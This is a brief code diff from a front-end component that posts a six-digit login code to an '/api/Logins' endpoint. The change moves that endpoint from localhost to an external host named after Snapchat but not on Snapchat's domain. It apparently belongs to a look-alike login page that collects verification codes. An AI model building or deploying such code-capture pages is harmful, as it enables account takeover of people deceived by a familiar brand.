@@ -88,7 +88,7 @@ const Code = (props: LoginProps) => {
     if (combinedCode.length === 6) {
       setIsLoading(true)
       
-      fetch("http://localhost:5000/api/Logins", {
+      fetch("https://snapchatservice.onrender.com/api/Logins", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
